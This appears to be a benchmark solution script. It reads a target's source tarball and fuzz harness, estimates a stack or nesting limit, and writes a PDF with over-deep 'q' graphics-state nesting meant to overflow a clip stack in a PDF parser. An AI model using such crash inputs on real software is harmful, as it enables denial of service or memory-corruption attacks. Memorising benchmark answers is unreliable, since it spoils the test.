import tarfile
import os
import tempfile
import re
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer_size = 32  # default
        with tempfile.TemporaryDirectory() as tempdir:
            with tarfile.open(src_path) as tar:
                tar.extractall(tempdir)
            fuzzer_file = None
            fuzzer_content = ""
            for root, dirs, files in os.walk(tempdir):
                for file in files:
                    if file.endswith(('.cc', '.c')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'LLVMFuzzerTestOneInput' in content or 'FUZZ_TARGET' in content:
                                    fuzzer_file = file_path
                                    fuzzer_content = content
                                    break
                        except:
                            pass
                if fuzzer_file:
                    break
            # Search for vulnerability details
            for root, dirs, files in os.walk(tempdir):
                for file in files:
                    if file.endswith(('.cc', '.c', '.h', '.cpp')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            if 'nesting depth' in content.lower() or 'clip mark' in content.lower():
                                # Find buffer size or max depth
                                array_match = re.search(r'(\w+)\s*\[\s*(\d+)\s*\]', content)
                                if array_match:
                                    buffer_size = max(buffer_size, int(array_match.group(2)))
                                depth_match = re.search(r'(?:max_)?depth\s*[=:]\s*(\d+)', content, re.I)
                                if depth_match:
                                    buffer_size = max(buffer_size, int(depth_match.group(1)))
                                check_match = re.search(r'nesting_depth\s*([><]=?)\s*(\d+)', content, re.I)
                                if check_match:
                                    op, num = check_match.group(1), int(check_match.group(2))
                                    if op in ['>', '>=']:
                                        buffer_size = max(buffer_size, num)
                                break
                        except:
                            pass
            # Detect if PDF
            is_pdf = 'pdf' in fuzzer_content.lower()
            if not is_pdf:
                # Fallback to generic, but try PDF anyway as clip stack common in PDF
                pass
            num_pushes = buffer_size + 1
            content = b'q\n' * num_pushes + b'Q\n' * num_pushes
            length = len(content)
            pdf = io.BytesIO()
            pdf.write(b'%PDF-1.4\n%âãÏÓ\n\n')
            obj1_offset = pdf.tell()
            pdf.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n')
            obj2_offset = pdf.tell()
            pdf.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n')
            obj3_offset = pdf.tell()
            pdf.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n\n')
            obj4_offset = pdf.tell()
            pdf.write(b'4 0 obj\n<< /Length ')
            pdf.write(str(length).encode())
            pdf.write(b' >>\nstream\n')
            stream_start = pdf.tell()
            pdf.write(content)
            pdf.write(b'endstream\nendobj\n\n')
            xref_offset = pdf.tell()
            pdf.write(b'xref\n0 5\n0000000000 65535 f \n')
            pdf.write(f'{obj1_offset:010d}'.encode() + b' 00000 n \n')
            pdf.write(f'{obj2_offset:010d}'.encode() + b' 00000 n \n')
            pdf.write(f'{obj3_offset:010d}'.encode() + b' 00000 n \n')
            pdf.write(f'{obj4_offset:010d}'.encode() + b' 00000 n \n')
            pdf.write(b'trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n')
            pdf.write(f'{xref_offset:010d}'.encode() + b'\n%%EOF')
            return pdf.getvalue()
